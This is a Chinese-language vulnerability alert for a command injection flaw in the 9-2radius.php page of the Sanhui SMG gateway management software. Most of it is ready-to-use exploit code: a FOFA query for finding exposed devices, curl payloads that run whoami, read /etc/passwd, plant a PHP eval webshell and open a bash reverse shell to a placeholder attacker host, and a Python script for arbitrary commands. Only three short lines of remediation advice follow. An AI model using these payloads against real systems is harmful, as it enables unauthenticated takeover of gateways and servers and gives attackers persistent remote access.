---
title: 【漏洞预警】三汇SMG网关 9-2radius.php 命令注入漏洞
---

## 漏洞概述
三汇SMG网关管理软件 9-2radius.php 存在远程命令执行漏洞，未经身份认证的攻击者可执行任意命令，控制服务器。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 三汇SMG网关管理软件 9-2radius.php 远程命令执行漏洞 |
| 漏洞类型 | 命令注入 |
| 影响组件 | 三汇SMG网关管理软件 |
| 严重程度 | 严重 |

## FOFA查询
```
body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
```

## POC
```bash
# 执行whoami
curl -X POST "http://target/en/9-2radius.php?authority=6" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "save=1&enable_radius=1&radius_address=/';whoami;#"

# 读取/etc/passwd
curl -X POST "http://target/en/9-2radius.php?authority=6" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "save=1&enable_radius=1&radius_address=/';cat+/etc/passwd;#"

# 写入webshell
curl -X POST "http://target/en/9-2radius.php?authority=6" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "save=1&enable_radius=1&radius_address=/';echo '<?php eval(\$_POST[1]);?>' > /var/www/html/shell.php;#"

# 反弹shell
curl -X POST "http://target/en/9-2radius.php?authority=6" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "save=1&enable_radius=1&radius_address=/';bash -i >& /dev/tcp/attacker/port 0>&1;#"
```

Python脚本:
```python
import requests

target = "http://target/en/9-2radius.php?authority=6"
cmd = "whoami"  # 替换为要执行的命令
payload = {
    "save": "1",
    "enable_radius": "1",
    "radius_address": f"/';{cmd};#"
}
r = requests.post(target, data=payload)
print(r.text)
```

## 修复建议
1. 联系厂商升级版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面